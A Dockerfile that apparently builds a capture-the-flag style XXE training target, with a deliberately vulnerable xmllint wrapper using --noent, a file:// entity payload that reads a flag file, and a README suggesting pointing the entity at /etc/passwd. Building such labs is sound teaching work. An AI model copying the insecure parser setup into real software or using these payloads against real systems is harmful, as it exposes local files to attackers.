# Tier-3 XXE target (~15 MB). xmllint resolves external entities (--noent), so an
# XML payload with a file:// entity reads local files.
FROM alpine:3.20
RUN apk add --no-cache libxml2-utils \
 && adduser -D -H labuser \
 && mkdir -p /challenge \
 && printf 'flag{xxe_external_entity_file_read}\n' > /challenge/flag.txt \
 && printf '<?xml version="1.0"?>\n<!DOCTYPE data [\n  <!ENTITY xxe SYSTEM "file:///challenge/flag.txt">\n]>\n<data>&xxe;</data>\n' > /challenge/payload.xml \
 && printf '#!/bin/sh\n# VULNERABLE: --noent resolves external entities\nxmllint --noent "$1"\n' > /usr/local/bin/parse-xml \
 && chmod 0755 /usr/local/bin/parse-xml /challenge/flag.txt /challenge/payload.xml \
 && printf 'NIELIT XXE target.\nThe XML parser resolves external entities.\n\nTry:\n  cat /challenge/payload.xml          # see the payload (file:// entity)\n  parse-xml /challenge/payload.xml    # entity expansion reads the flag\n  # write your own payload to /tmp and point the entity at /etc/passwd\n' > /challenge/README
USER labuser
CMD ["sleep", "infinity"]
